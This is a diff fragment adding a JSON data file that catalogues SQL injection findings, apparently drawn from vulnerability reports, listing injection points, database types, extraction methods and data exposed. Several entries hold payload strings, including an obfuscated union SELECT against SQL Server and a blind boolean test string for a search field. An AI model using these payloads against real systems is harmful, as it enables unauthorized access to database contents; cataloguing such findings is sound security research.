+      ]
+    },
+    {
+      "injection_vector": "/api/river/observed-data/GVDA1",
+      "database_type": "Microsoft SQL Server 2017",
+      "injection_type": "Union-based, Time-based",
+      "extraction_method": "Union SELECT to extract hostname and version, Time-based delay using WAITFOR DELAY",
+      "payload_example": "GVDA1'+ /*!50000union*/ SELECT HOST_NAME()-- -",
+      "data_exposed": [
+        "hostname",
+        "database version"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": "MySQL",
+      "injection_type": "Blind",
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "search term input in CVE Discovery Search",
+      "database_type": null,
+      "injection_type": "Blind or timing-based SQL injection",
+      "extraction_method": "Using search terms with injection payloads to confirm results returned or not (blind/timing-based attack)",
+      "payload_example": "'1%'='1 and ' and '1%'='0",
+      "data_exposed": [
+        "report data",
+        "team data",
+        "asset data"
+      ]
+    }
+  ],
+  "generated_at": "2025-09-17T17:40:56.919909"
+}
